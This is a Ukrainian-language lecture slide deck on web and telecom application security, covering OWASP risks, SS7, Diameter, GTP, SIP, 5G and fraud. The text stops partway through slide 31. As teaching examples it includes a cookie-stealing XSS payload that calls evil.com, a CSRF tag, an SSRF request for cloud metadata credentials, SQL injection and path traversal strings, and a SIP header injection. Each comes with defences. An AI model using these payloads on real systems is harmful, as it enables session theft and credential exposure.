---
marp: true
theme: default
class: invert
paginate: true
lang: uk
style: |
  section {
    font-size: 1.1em;
    background-color: #0d1117;
    color: #c9d1d9;
  }
  h1 { color: #58a6ff; font-size: 1.45em; }
  h2 { color: #58a6ff; font-size: 1.18em; }
  h3 { color: #e8b04b; font-size: 0.9em; }
  strong { color: #e8b04b; }
  code { background: #161b22; color: #58a6ff; padding: 1px 4px; border-radius: 4px; }
  pre code { color: #c9d1d9; font-size: 0.8em; line-height: 1.25; }
  table { font-size: 0.7em; width: 100%; }
  th { background: #1f6feb; padding: 3px 5px; }
  td { padding: 3px 7px; border-bottom: 1px solid #30363d; }
  .highlight { color: #e8b04b; font-weight: bold; }
  a { color: #58a6ff; }
  footer { color: #8b949e; font-size: 0.7em; }
---

<!-- ===== СЛАЙД 1: Титульний ===== -->

# Безпека веб- та телеком-застосунків

## Web & Telecom Application Security

Лекція 7 | Курс: Інформаційна безпека телекомунікаційних та хмарних технологій

---

Модуль 2 — Захист сервісів, інциденти та відповідність

---

<!-- ===== СЛАЙД 2: План лекції ===== -->

## План лекції

| # | Розділ | Слайди |
|---|--------|--------|
| 1 | **Безпека веб-застосунків** | 3–13 |
| 2 | **Безпека телеком-застосунків** | 14–33 |
| 3 | **Хмара та DevSecOps** |  34–37 |
| — | Підсумок та питання | 38 |

**Теми розділу 1:** OWASP Top 10, Injection, Auth, XSS, CSRF/SSRF, IDOR, WAF, TLS, API

**Теми розділу 2:** SS7, Diameter, GTP, VoIP/SIP, SMS, 5G, Telecom API, Mobile, Fraud

**Теми розділу 3:** AWS WAF/Shield, CloudFront, DevSecOps pipeline, Compliance

---

<!-- ===== СЛАЙД 3: Безпека веб-застосунків — огляд ===== -->

## Безпека веб-застосунків: огляд

### Ландшафт загроз

- Веб-застосунки — **найбільша поверхня атаки** для більшості організацій
- 43% порушень даних пов'язані з веб-застосунками (Verizon DBIR 2023)
- Телеком-оператори мають сотні зовнішніх порталів, API, білінгових систем

### Основні вектори атак

| Вектор | Приклади |
|--------|---------|
| **Client-side** | XSS, CSRF, Clickjacking |
| **Server-side** | SQLi, SSRF, Deserialization |
| **Infrastructure** | DDoS, TLS Downgrade, DNS Hijacking |
| **API** | BOLA, Mass Assignment, Rate Limit bypass |

### Чому важливо для телекому

- Веб-портали (self-care, billing, OSS/BSS)
- REST/SOAP API для інтеграцій
- B2B партнерські інтерфейси

---

<!-- ===== СЛАЙД 4: OWASP Top 10 ===== -->

## OWASP Top 10 — 2021

| # | Категорія | Приклад |
|---|-----------|---------|
| **A01** | Broken Access Control | IDOR, privilege escalation |
| **A02** | Cryptographic Failures | Hardcoded keys, слабкий шифр |
| **A03** | Injection | SQL, NoSQL, OS, LDAP |
| **A04** | Insecure Design | Відсутність threat modeling |
| **A05** | Security Misconfiguration | Debug режим, default паролі |
| **A06** | Vulnerable Components | Log4Shell, Struts CVE |
| **A07** | Auth Failures | Brute force, слабкі паролі |
| **A08** | Integrity Failures | CI/CD компрометація, CSRF |
| **A09** | Logging Failures | Відсутність логів подій безпеки |
| **A10** | SSRF | Запити до внутрішніх ресурсів |

> **OWASP** — Open Web Application Security Project, провідна некомерційна організація з безпеки застосунків

---

<!-- ===== СЛАЙД 5: Ін'єкційні атаки ===== -->

## Ін'єкційні атаки (Injection)

### SQL Injection

```sql
-- Вразливий запит (PHP)
$q = "SELECT * FROM users WHERE id='" . $_GET['id'] . "'";

-- Атака: id = 1' OR '1'='1
-- Результат: SELECT * FROM users WHERE id='1' OR '1'='1'

-- Захист: підготовлені вирази (Prepared Statements)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

### Типи ін'єкцій

| Тип | Опис | Захист |
|-----|------|--------|
| **SQL Injection** | Маніпуляція SQL-запитами | Prepared statements |
| **NoSQL Injection** | MongoDB `$where`, `$gt` | Схема валідації |
| **OS Command** | `system()`, `exec()` | Allowlist, ескейпінг |
| **LDAP Injection** | Маніпуляція LDAP-фільтрами | LDAP escaping |

**Захист:** параметризовані запити, ORM, валідація вхідних даних, WAF

---

<!-- ===== СЛАЙД 6: Аутентифікація та сесії ===== -->

## Аутентифікація та управління сесіями

### Типові вразливості

- **Brute force / Credential stuffing** — перебір паролів або витоклих облікових даних
- **Слабкі паролі** — відсутність політики складності
- **Session fixation / Hijacking** — крадіжка або фіксація ідентифікатора сесії
- **JWT-атаки** — `alg:none`, слабкий секрет, відсутність перевірки expiration

### JWT Security

```json
// Вразливий header
{ "alg": "none", "typ": "JWT" }  ← небезпечно!

// Безпечний header
{ "alg": "RS256", "typ": "JWT" }
```

### Кращі практики

| Захід | Опис |
|-------|------|
| **MFA** | Друга форма автентифікації (TOTP, FIDO2) |
| **HttpOnly Cookie** | JavaScript не може читати cookie |
| **SameSite=Strict** | Захист від CSRF у cookies |
| **OAuth 2.0 / OIDC** | Стандартна делегована автентифікація |
| **Rate Limiting** | Обмеження спроб входу |

---

<!-- ===== СЛАЙД 7: XSS ===== -->

## XSS — Cross-Site Scripting

### Типи XSS

- **Reflected XSS** — скрипт повертається у відповіді сервера (пошук, error pages)
- **Stored XSS** — скрипт зберігається в БД і виконується для всіх відвідувачів
- **DOM-based XSS** — скрипт виконується через DOM без звернення до сервера

### Приклад атаки (Stored XSS)

```html
<!-- Зловмисник вводить у форму коментаря: -->
<script>document.location='https://evil.com/?c='+document.cookie</script>

<!-- Жертва відвідує сторінку — cookie передаються атакуючому -->
```

### Наслідки

- Крадіжка cookies / session tokens
- Дефейс сторінки, фішинг
- Keylogging, browser exploitation

### Захист

| Захід | Реалізація |
|-------|-----------|
| **Output Encoding** | `htmlspecialchars()`, DOMPurify |
| **CSP** | `Content-Security-Policy: script-src 'self'` |
| **HttpOnly** | Cookie недоступні для JS |
| **X-XSS-Protection** | HTTP-заголовок захисту |

---

<!-- ===== СЛАЙД 8: CSRF та SSRF ===== -->

## CSRF та SSRF

### CSRF — Cross-Site Request Forgery

Зловмисник змушує браузер жертви виконати небажаний запит:

```html
<!-- Шкідлива сторінка attacker.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**Захист:** CSRF токени, `SameSite=Strict`, перевірка `Origin/Referer`

---

### SSRF — Server-Side Request Forgery

Сервер виконує HTTP-запит до URL, вказаного атакуючим:

```
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/credentials
```

**Хмарний контекст:** AWS IMDSv1 → витік IAM credentials (Capital One 2019)

**Захист:**
- Allowlist дозволених доменів
- Блокування `169.254.169.254` (metadata)
- Використання IMDSv2 (токен-запит)
- Відключення непотрібних outbound з'єднань

---

<!-- ===== СЛАЙД 9: IDOR та Broken Access Control ===== -->

## IDOR та Broken Access Control

### IDOR — Insecure Direct Object Reference

```
# Вразливий URL — зміна ID дає доступ до чужих даних
GET /api/invoices/12345   ← законний запит
GET /api/invoices/12346   ← чужий рахунок!

# Захист — UUID замість послідовних ID
GET /api/invoices/7f3a9c2b-4e1d-4f2a-b8c9-1234567890ab
```

### Типи порушень контролю доступу

| Тип | Опис |
|-----|------|
| **Горизонтальна ескалація** | Доступ до ресурсів іншого користувача |
| **Вертикальна ескалація** | Отримання вищих привілеїв (user → admin) |
| **Path Traversal** | `/../../../etc/passwd` |
| **Forceful Browsing** | Прямий доступ до захищених URL |

### Захист

- Серверна авторизація (ніколи не покладатись на клієнт)
- ABAC (Attribute-Based Access Control)
- UUID/ULID замість послідовних ID
- Тестування: OWASP ZAP, Burp Suite

---

<!-- ===== СЛАЙД 10: WAF ===== -->

## Web Application Firewall (WAF)

### Що таке WAF

WAF — пристрій або сервіс, який аналізує HTTP/HTTPS трафік і блокує шкідливі запити на основі правил.

### Режими роботи

- **Detection mode** — лише логування (не блокує)
- **Prevention mode** — активне блокування

### Типи правил AWS WAF

| Тип | Опис |
|-----|------|
| **Managed Rules** | Готові набори (OWASP, Bot Control, AWSManagedRulesCommonRuleSet) |
| **Rate-based Rules** | Обмеження кількості запитів з IP |
| **Regex Pattern Sets** | Кастомні регулярні вирази |
| **IP Sets** | Дозволені/заблоковані IP-адреси |
| **Geo Match** | Фільтрація за географією |

### Важливо знати

- **False Positive** — легітимний запит заблокований (погіршує UX)
- **False Negative** — атака пропущена (небезпечно)
- WAF не є єдиним засобом захисту — **Defense in Depth**
- Обходи WAF: URL-encoding, case variations, whitespace

---

<!-- ===== СЛАЙД 11: HTTPS та TLS ===== -->

## HTTPS та TLS для веб-застосунків

### TLS 1.3 (RFC 8446) — ключові покращення

- **1-RTT handshake** (vs 2-RTT у TLS 1.2) → швидше
- **0-RTT** resumption для повторних з'єднань
- Видалено слабкі алгоритми: RC4, 3DES, MD5, SHA-1, RSA key exchange
- Обов'язкова **Perfect Forward Secrecy** (ECDHE)

### Захисні HTTP-заголовки

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

### Типові помилки

| Помилка | Наслідок |
|---------|---------|
| Mixed content (HTTP в HTTPS) | Предсесійний контент незахищений |
| Прострочений сертифікат | Браузер блокує доступ |
| Слабкі cipher suites (RC4, 3DES) | Вразливість до атак |
| Самопідписаний сертифікат | Немає перевірки CA |

**Інструменти:** SSL Labs (ssllabs.com/ssltest), Mozilla Observatory

---

<!-- ===== СЛАЙД 12: Безпека API ===== -->

## Безпека API (REST, GraphQL, gRPC)

### OWASP API Security Top 10 (2023)

| # | Назва | Опис |
|---|-------|------|
| **API1** | BOLA | Broken Object Level Authorization (IDOR для API) |
| **API2** | Auth Failures | Слабка автентифікація |
| **API3** | Object Property Auth | Надмірні поля у відповіді |
| **API4** | Unrestricted Resource | Відсутність rate limiting |
| **API5** | Function Auth | Доступ до адмін-функцій |
| **API6** | Unrestricted Access | Надмірний доступ до чутливих даних |
| **API7** | SSRF | Через webhook/import URLs |
| **API8** | Security Misconfig | Відкрита документація, debug |
| **API9** | Improper Inventory | Тіньові/незадокументовані API |
| **API10** | Unsafe Consumption | Довіра зовнішнім API без валідації |

### GraphQL-специфічні атаки

- **Introspection** — розкриття схеми БД
- **Query depth attack** — нескінченно вкладені запити → DoS
- **Batching attack** — масові запити в одному HTTP виклику

---

<!-- ===== СЛАЙД 13: DevSecOps для веб ===== -->

## DevSecOps для веб-застосунків

### Shift-Left Security

Переміщення тестування безпеки якомога раніше в SDLC.

### Інструменти по фазах CI/CD

| Фаза | Тип | Інструмент | Що перевіряє |
|------|-----|------------|-------------|
| Pre-commit | Secrets scan | GitLeaks, git-secrets | Витоки ключів |
| Build | SAST | SonarQube, Semgrep | Вразливий код |
| Build | SCA | OWASP DC, Snyk | Вразливі залежності |
| Test | DAST | OWASP ZAP, Burp | Живі вразливості |
| Deploy | IaC scan | Checkov, tfsec | Небезпечні конфігурації |
| Runtime | WAF + Monitoring | AWS WAF, GuardDuty | Атаки в реальному часі |

### SAST vs DAST

```
SAST (Static):  аналізує вихідний код, без запуску → false positives
DAST (Dynamic): атакує запущений застосунок → реальні вразливості
```

> Золотий стандарт: **SAST + SCA на CI + DAST на staging + пентест перед релізом**

---

<!-- ===== СЛАЙД 14: Безпека телеком-застосунків — огляд ===== -->

## Безпека телеком-застосунків: огляд

### Унікальність телеком

- Критична інфраструктура — зупинка сервісу = національна проблема
- Обробляють голос, дані, локацію мільярдів людей
- Старі протоколи (SS7, 1975р.) досі в роботі
- Стик між IP і традиційними телефонними мережами

### Ключові протоколи та їх покоління

| Протокол | Покоління | Призначення |
|----------|-----------|-------------|
| **SS7** (MAP/ISUP) | 2G/3G | Сигналізація, SMS, роумінг |
| **Diameter** | 4G/LTE | Аутентифікація, авторизація |
| **GTP** | 3G/4G | Тунелювання пакетів |
| **SIP** | VoIP | IP-телефонія |
| **HTTP/2 (SBA)** | 5G | Мікросервісна архітектура ядра |

### Типи загроз

- **Протокольні атаки** — вразливості самих протоколів (SS7, Diameter)
- **Application-level** — вразливості білінгу, порталів, API
- **Шахрайство (Fraud)** — IRSF, SIM-swap, toll fraud
- **DoS/DDoS** — сигнальний флудинг, виснаження ресурсів

---

<!-- ===== СЛАЙД 15: SS7 — архітектура та вразливості ===== -->

## SS7 — Signaling System 7

### Архітектура SS7

- **MSC** (Mobile Switching Center) — комутація дзвінків
- **HLR** (Home Location Register) — база абонентів оператора
- **VLR** (Visitor Location Register) — тимчасова база роумінгу
- **SMSC** (SMS Center) — обробка SMS

### Чому SS7 небезпечний

- Розроблений у **1975 році** — жодної автентифікації між операторами
- Будь-який оператор у SS7-мережі може надсилати будь-які повідомлення
- Доступ до SS7 можна купити за ~$1000/міс через сірих операторів

### Категорії атак SS7

| Категорія | Повідомлення | Результат |
|-----------|-------------|-----------|
| **Відстеження локації** | SendRoutingInfo, ProvideSubscriberInfo | GPS-точність без згоди |
| **Перехоплення SMS** | UpdateLocation, MO-ForwardSM | Крадіжка OTP-кодів |
| **Перехоплення дзвінків** | RegisterSS (CallForward) | MITM дзвінків |
| **DoS** | CancelLocation | Абонент не доступний |
| **Шахрайство** | USSD forwarding | Переадресація грошей |

> **Реальні випадки:** прослуховування депутатів Бундестагу (2014), крадіжка Bitcoin через 2FA (2017)

---

<!-- ===== СЛАЙД 16: SS7 — захист ===== -->

## SS7 — захист та рекомендації

### Технічний захист

```
Категорія 1 (мінімум): Фільтрація повідомлень від невідомих точок
  → Блокувати PSI/SRI від сторонніх мереж
  → SMS Home Routing (всі вхідні SMS через SMSC оператора)

Категорія 2 (рекомендовано): Аналіз потоків сигналізації
  → Detect UpdateLocation з нерідних PLMN
  → Виявлення аномалій CDR

Категорія 3 (просунутий): Машинне навчання + поведінковий аналіз
  → Кореляція SS7 + IP + CDR
  → Автоматичне блокування підозрілих транзакцій
```

### GSMA рекомендації

| Документ | Зміст |
|----------|-------|
| **GSMA FS.11** | Захист SS7 мережі — категорії загроз та контрзаходи |
| **GSMA FS.19** | Diameter security guidelines |
| **GSMA FS.07** | Захист HLR/HSS від несанкціонованого доступу |

### Стратегічний захист

- **Міграція на 5G** — захищена архітектура SEPP
- **SMS Home Routing** — обов'язковий мінімум
- **SS7 Firewall** + **постійний моніторинг**

---

<!-- ===== СЛАЙД 17: Diameter ===== -->

## Diameter — 4G/LTE Signaling Protocol

### Diameter vs RADIUS

| Критерій | RADIUS | Diameter |
|----------|--------|----------|
| Транспорт | UDP | TCP/SCTP |
| TLS | Опціонально | Обов'язково (рекомендовано) |
| Failure detection | Обмежено | Вбудована підтримка |
| Масштабованість | Обмежена | Висока |

### Архітектура 4G Diameter

- **HSS** (Home Subscriber Server) — база абонентів
- **MME** (Mobility Management Entity) — управління мобільністю  
- **PCRF** (Policy and Charging Rules Function) — тарифікація

### Вразливості Diameter

- **Spoofing** Origin-Host/Origin-Realm — видавати себе за інший вузол
- **Subscriber location** — ULR/ULA розкриває локацію
- **Cancel-Location** — примусовий logout абонента (DoS)
- **Replay attacks** — повторне надсилання перехоплених команд

### Захист

- **IPSec / TLS** між всіма Diameter вузлами
- **Diameter Edge Agent (DEA)** — брандмауер для Diameter
- Фільтрація за Origin-Realm (whitelist операторів)

---

<!-- ===== СЛАЙД 18: GTP — GPRS Tunneling Protocol ===== -->

## GTP — GPRS Tunneling Protocol

### Роль GTP

- **GTP-C** (Control Plane) — сигналізація: Create/Delete Session
- **GTP-U** (User Plane) — тунелювання пакетів користувача

### Вразливості GTP

| Атака | Метод | Наслідок |
|-------|-------|---------|
| **Cell spoofing** | Підроблений Create Session Request | Несанкціонований тунель |
| **IP spoofing** | Підробка IP всередині GTP-тунелю | Обхід firewall |
| **Resource exhaustion** | Флудинг GTP-C запитами | DoS GW/PGW |
| **Subscriber impersonation** | IMSI/TEID підробка | Перехоплення трафіку |

```
# Приклад: GTP-C Create Session Request з підробленим IMSI
GTPv2-C Create Session Request:
  IMSI: 255010123456789  ← підроблений IMSI жертви
  MSISDN: +380501234567
  APN: internet
```

### Захист

- **GTP Firewall** між GGSN/PGW та інтернетом
- **GSMA IR.77** — рекомендації захисту GTP
- Валідація IMSI/TEID на кордоні
- Ізоляція сигнального та користувацького трафіку

---

<!-- ===== СЛАЙД 19: VoIP та SIP безпека ===== -->

## VoIP та SIP безпека

### SIP протокол (Session Initiation Protocol)

```
Alice → SIP Proxy → Bob

REGISTER sip:telecom.ua SIP/2.0   ← реєстрація
INVITE sip:bob@telecom.ua SIP/2.0  ← ініціювання дзвінка
BYE sip:alice@telecom.ua SIP/2.0  ← завершення
```

### Атаки на SIP

| Атака | Опис |
|-------|------|
| **Registration Hijacking** | Підроблений REGISTER → дзвінки йдуть атакуючому |
| **INVITE Flooding** | Тисячі INVITE → DoS SIP сервера |
| **Eavesdropping** | Перехоплення RTP без SRTP |
| **Toll Fraud** | Несанкціоновані міжнародні дзвінки |
| **SIP Scanning** | Enumeration розширень (SIPVicious) |

### SIP Injection

```
# Зловмисник маніпулює SIP заголовками:
INVITE sip:9999@telecom.ua SIP/2.0
To: <sip:1000@telecom.ua>\r\n
Via: SIP/2.0/UDP attacker.com   ← injected header
```

### Захист

- **SBC** (Session Border Controller) — нормалізація, rate limiting, auth
- **SRTP + SIPS (TLS)** — шифрування медіа та сигналізації
- Digest автентифікація + обмеження реєстрацій

---

<!-- ===== СЛАЙД 20: SIP — детальні атаки та захист ===== -->

## SIP — Атаки та захист: зведена таблиця

| Атака | Метод | Наслідок | Захист |
|-------|-------|---------|--------|
| **Registration Hijacking** | REGISTER з підробленим From | Крадіжка ідентичності | Digest auth + TLS |
| **INVITE Flooding** | Масові INVITE | DoS SIP proxy | Rate limiting, SBC |
| **RTP Injection** | Вставка в медіа-потік | Спотворення аудіо | SRTP |
| **Toll Fraud** | Несанкціонований INVITE | Фінансові втрати | Auth + ACL |
| **Eavesdropping** | Пасивне прослуховування RTP | Запис дзвінків | SRTP + SIPS |
| **SIP Scanning** | OPTIONS/REGISTER probe | Розкриття структури | Fail2ban, SBC |

### Session Border Controller (SBC)

SBC — граничний елемент між внутрішньою SIP-мережею та зовнішнім світом:

- Нормалізація SIP повідомлень (fix malformed headers)
- Rate limiting та антифлуд
- TLS термінація
- Прихування топології (topology hiding)
- Транскодування медіа

### Стандарти безпеки VoIP

- **RFC 3261** — базовий SIP протокол
- **RFC 5630** — SIPS URI (SIP over TLS)
- **RFC 3711** — SRTP (Secure RTP)
- **ETSI TS 133 203** — 3GPP IMS безпека

---

<!-- ===== СЛАЙД 21: SMS-безпека та атаки ===== -->

## SMS-безпека та атаки

### Типи SMS-атак

| Атака | Метод | Наслідок |
|-------|-------|---------|
| **Smishing** | SMS з фішинговим посиланням | Крадіжка облікових даних |
| **SMS Spoofing** | Підробка sender ID (Alpha tag) | Видавання за банк/оператора |
| **SMS Pumping** | Масові SMS на premium номери | Fraud + фінансові збитки |
| **SIM Swapping** | SS7 + соціальна інженерія | Контроль номера жертви |
| **OTP Bypass** | SS7 перехоплення SMS | Обхід 2FA банку |

### SIM Swap атака — покрокова схема

```
1. Зловмисник збирає OSINT про жертву
2. Дзвінок оператору + соціальна інженерія → перевипуск SIM
3. Або: SS7 UpdateLocation → SMS перенаправляються на підроблений SMSC
4. Зловмисник отримує SMS з OTP для банку
5. Виводить кошти
```

### Статистика та наслідки

- SMS 2FA вразлива через SS7 → NIST рекомендує **уникати SMS OTP**
- FBI IC3 2022: SIM swap fraud — $72.7M збитків

### Захист

- App-based 2FA (Google Authenticator, TOTP) замість SMS
- Hardware keys (FIDO2/YubiKey)
- Оператори: SMS Home Routing + SS7 firewall
- Банки: перевірка номера при транзакціях

---

<!-- ===== СЛАЙД 22: 5G безпека ===== -->

## 5G — безпека нової архітектури

### Покращення безпеки 5G над 4G

| Функція | 4G | 5G |
|---------|----|----|
| **IMSI захист** | Відкритий IMSI (IMSI catcher) | SUPI → SUCI (зашифрований) |
| **Автентифікація** | EPS-AKA | 5G-AKA + EAP-AKA' |
| **Роумінг захист** | Немає шифрування між операторами | SEPP (Security Edge Protection Proxy) |
| **Архітектура ядра** | Монолітна | Service-Based Architecture (SBA) |
| **API безпека** | Proprietary | OAuth 2.0 + TLS |

### Нові вектори атак 5G

- **Network Slicing** — порушення ізоляції між слайсами
- **Open RAN (O-RAN)** — відкрите ПЗ → більша поверхня атаки
- **HTTP/2 N-інтерфейси** — вразливості HTTP-стека в ядрі
- **API Core Network** — BOLA, injection в NF APIs

### 3GPP TS 33.501 — ключові вимоги

- Обов'язкова SUCI замість IMSI
- SEPP для всього роумінгового трафіку
- Mutual TLS між network functions
- Логування та аудит безпекових подій

---

<!-- ===== СЛАЙД 23: 5G Network Slicing та SEPP ===== -->

## 5G — Network Slicing та SEPP

### Network Slicing Security

```
5G Core
├── Slice A (eMBB) — мобільний широкосмуговий
│   └── Ізоляція: окремі NFs, VLANs, keys
├── Slice B (URLLC) — IoT/промисловість
│   └── Ізоляція: низька затримка, критично важлива
└── Slice C (mMTC) — масовий IoT
    └── Ізоляція: спільна інфраструктура → ризик
```

**Ризик cross-slice атак:** спільне фізичне обладнання може бути вектором ескалації.

### SEPP — Security Edge Protection Proxy

SEPP захищає трафік між операторами (roaming):

- **N32 інтерфейс** між операторами
- **TLS** + **JOSE** (application-layer security на рівні повідомлень)
- Приховування топології оператора
- Фільтрація роумінгового трафіку

### 5G SBA (Service-Based Architecture)

```
NRF (Network Repository Function) — реєстрація NFs
  ↓ OAuth 2.0 Client Credentials
AMF ──token──► UDM   (автентифіковані API запити)
SMF ──token──► PCF
```

Стандарт: **3GPP TS 33.501** + **3GPP TS 33.512**

---

<!-- ===== СЛАЙД 24: Telecom APIs ===== -->

## Telecom APIs — безпека

### Типи Telecom API

| Тип | Організація | Приклад |
|-----|-------------|---------|
| **GSMA Open Gateway** | GSMA | Number Verification, QoD API |
| **CAMARA** | Linux Foundation | Location API, SIM Swap detection |
| **OMA APIs** | OMA | Location, Messaging, Payment |
| **Carrier Billing** | Operators | Direct Carrier Billing APIs |

### Специфічні ризики Telecom API

- **BOLA (IDOR)** — `/api/subscriber/{msisdn}/location` без авторизації
- **Mass Assignment** — зміна тарифного плану через невалідовані поля
- **Insufficient Rate Limiting** → enumeration абонентів
- **Пряме відкриття API** без API Gateway — відсутність auth/logging

### Приклад вразливості Telecom API

```http
GET /api/v1/subscriber/380501234567/location HTTP/1.1
Authorization: Bearer eyJ...  ← токен іншого абонента

HTTP/200 OK {"lat": 50.4501, "lon": 30.5234}  ← BOLA!
```

### Захист Telecom API

- **API Gateway** (AWS API Gateway, Kong) — централізована auth, rate limiting
- **OAuth 2.0** з scope обмеженнями
- Server-side авторизація на рівні subscriber ID
- Логування всіх API запитів

---

<!-- ===== СЛАЙД 25: Мобільні застосунки ===== -->

## Безпека мобільних застосунків

### Платформна модель безпеки

| Аспект | Android | iOS |
|--------|---------|-----|
| **Sandbox** | SELinux + ART sandbox | iOS App Sandbox |
| **Permissions** | Runtime permissions | Privacy manifest |
| **Розподіл** | Play Protect + sideloading | App Store (строгий) |
| **Root/Jailbreak** | Root detection APIs | Jailbreak detection |
| **Key storage** | Android Keystore (HSM) | Secure Enclave |

### Типові вразливості мобільних застосунків

- **Небезпечне зберігання даних** — SharedPreferences, SQLite без шифрування, логи
- **Небезпечна комунікація** — certificate pinning bypass, HTTP замість HTTPS
- **Reverse engineering** — відсутність obfuscation → витік бізнес-логіки
- **Небезпечна автентифікація** — збереження паролів у пам'яті

### Telecom-специфічні додатки

- **Mobile banking** — eSIM management, carrier authentication
- **Carrier apps** — доступ до мережевих налаштувань, SIM toolkit
- **VoIP clients** — WebRTC безпека, SIP over TLS

### Інструменти тестування

- **MobSF** (Mobile Security Framework) — статичний і динамічний аналіз
- **Frida** — динаміна інструментація (hooking)
- **apktool / jadx** — декомпіляція APK

---

<!-- ===== СЛАЙД 26: OWASP Mobile Top 10 ===== -->

## OWASP Mobile Top 10 (2024)

| # | Категорія | Ключова загроза | Захист |
|---|-----------|----------------|--------|
| **M1** | Improper Credential Usage | Hardcoded keys, незахищені credentials | Android Keystore, Secure Enclave |
| **M2** | Inadequate Supply Chain | Шкідливі SDK/залежності | SCA, dependency audit |
| **M3** | Insecure Auth/Authorization | Слабка аутентифікація | MFA, biometrics, PKCE |
| **M4** | Insufficient Input Validation | Injection в мобільних | Whitelist validation |
| **M5** | Insecure Communication | HTTP, слабкий TLS | HTTPS + cert pinning |
| **M6** | Inadequate Privacy | Збір зайвих даних | Privacy by design |
| **M7** | Insufficient Binary Protection | Легкий реверс | Obfuscation, RASP |
| **M8** | Security Misconfiguration | Debug флаги, backup=true | Hardening checklist |
| **M9** | Insecure Data Storage | Plaintext у SharedPrefs | EncryptedSharedPrefs |
| **M10** | Insufficient Cryptography | Кастомна крипто, MD5 | AES-256-GCM, stdlib |

### Телеком-специфічний ризик

- Carrier apps часто мають **привілейований доступ** до SIM Toolkit
- eSIM management apps — контроль над підпискою оператора
- **IMSI розкриття** через некоректну телефонну бібліотеку

---

<!-- ===== СЛАЙД 27: AWS API Gateway — безпека ===== -->

## AWS API Gateway — безпека

### Типи API Gateway

- **REST API** — повнофункціональний, підтримує всі auth методи
- **HTTP API** — легший, дешевший, JWT автентифікація
- **WebSocket API** — двонаправлені з'єднання для real-time

### Методи авторизації

| Метод | Опис | Використання |
|-------|------|-------------|
| **Cognito User Pools** | Управління користувачами | User-facing APIs |
| **Lambda Authorizer** | Кастомна логіка аутентифікації | Flexible auth |
| **IAM Auth** | AWS SigV4 | Сервіс-до-сервісу |
| **API Key** | Простий ключ | Не самостійно! |
| **mTLS** | Взаємна аутентифікація cert | B2B/IoT |

### Захисні функції

- **WAF інтеграція** — прикріплення AWS WAF WebACL
- **Resource Policy** — обмеження за IP/VPC/AWS account
- **Throttling** — rate limiting (burst + rate)
- **Usage Plans** — квоти для API Keys
- **Private APIs** — доступні лише через VPC endpoint

### Логування

```json
{ "requestId": "abc-123", "ip": "1.2.3.4",
  "httpMethod": "POST", "status": 403,
  "errorMessage": "WAF blocked: SQLi detected" }
```

---

<!-- ===== СЛАЙД 28: AWS API Gateway — конфігурація ===== -->

## AWS API Gateway — приклади конфігурації

### Resource Policy (обмеження IP)

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "execute-api:Invoke",
    "Resource": "arn:aws:execute-api:*:*:*/prod/*",
    "Condition": {
      "IpAddress": { "aws:SourceIp": ["203.0.113.0/24"] }
    }
  }]
}
```

### Lambda Authorizer

```python
def lambda_handler(event, context):
    token = event['authorizationToken']
    # Перевірка JWT токена
    payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
    
    return {
        "principalId": payload["sub"],
        "policyDocument": allow_policy(event["methodArn"]),
        "context": {"msisdn": payload.get("phone_number")}
    }
```

### Таблиця: порівняння методів авторизації

| Метод | Затримка | Складність | Безпека |
|-------|---------|------------|---------|
| Cognito | ~10ms | Низька | Висока |
| Lambda Authorizer | ~50ms | Висока | Дуже висока |
| IAM | ~5ms | Середня | Висока |

---

<!-- ===== СЛАЙД 29: Telecom Fraud ===== -->

## Telecom Fraud — типи та виявлення

### Типи шахрайства в телекомі

| Тип | Опис | Збитки |
|-----|------|--------|
| **IRSF** (Intl Revenue Share Fraud) | Дзвінки на premium номери | ~$6.1B/рік |
| **PBX/Toll Fraud** | Злом корпоративних АТС | ~$4B/рік |
| **SIM Box** | Приземлення VoIP через SIM-карти | Ухилення від оплати |
| **Wangiri** | Один дзвінок → передзвон на premium | $1-2B/рік |
| **Subscription Fraud** | Фіктивні підписки на сервіси | Фінансові збитки |
| **Roaming Fraud** | Зловживання роумінговими умовами | Оператор несе збитки |

> **CFCA (Communications Fraud Control Association) 2021:** загальні збитки від телеком-шахрайства — **$38.95 мільярдів** на рік

### Виявлення шахрайства

```
CDR Analysis Pipeline:
CDR (Call Detail Records) → Streaming (Kafka)
  → ML Anomaly Detection (velocity, geo, pattern)
  → Real-time FMS (Fraud Management System)
  → Block / Alert / Investigate
```

**Ознаки IRSF:** різкий ріст дзвінків на конкретні префікси, нові SIM + миттєво дзвінки за кордон

### Системи захисту

- **FMS** (Fraud Management System) — Subex, TEKELEC
- **Velocity checks** — >N дзвінків за X хвилин → блокування
- **ML-моделі** — аномальна поведінка абонента

---

<!-- ===== СЛАЙД 30: Eavesdropping та перехоплення ===== -->

## Eavesdropping та перехоплення в телекомі

### IMSI Catcher (Stingray)

```
Легітимна вишка: BTS → BSC → MSC → HLR
                  ↑ сильний сигнал

IMSI Catcher (фіктивна вишка):
  1. Емітує потужний сигнал → телефон підключається
  2. Отримує IMSI/TMSI → ідентифікація абонента
  3. MITM між телефоном та легітимною вишкою
  4. Downgrade до 2G (GSM) → шифрування A5/1 (зламане)
```

### Методи перехоплення

| Метод | Покоління | Складність | Доступність |
|-------|-----------|-----------|------------|
| IMSI Catcher | 2G-4G | Середня | Держструктури, злочинці |
| SS7 Call Forward | 2G-3G | Низька | Будь-хто з SS7 доступом |
| Diameter Intercept | 4G | Висока | Спецслужби |
| GSM Downgrade | 2G fallback | Середня | Спеціалізоване ПО |

### Законне перехоплення (LI — Lawful Interception)

- **ETSI TS 101 331** — стандарт LI для фіксованих мереж
- **3GPP TS 33.108** — LI для мобільних мереж
- Оператори **зобов'язані** надавати LI можливості за рішенням суду

### Захист для кінцевого користувача

- End-to-end шифрування: Signal Protocol, WhatsApp
- VPN для всього трафіку
- **Уникати SMS 2FA** для критичних акаунтів

---

<!-- ===== СЛАЙД 31: DDoS-атаки на телеком ===== -->

## DDoS-атаки на телеком-мережі

### Телеком-специфічні DDoS

| Тип атаки | Протокол | Інструмент | Захист |
|-----------|----------|-----------|--------|
| **SIP Flood** (INVITE/REGISTER) | SIP/UDP | SIPVicious, Metasploit | SBC rate limiting |
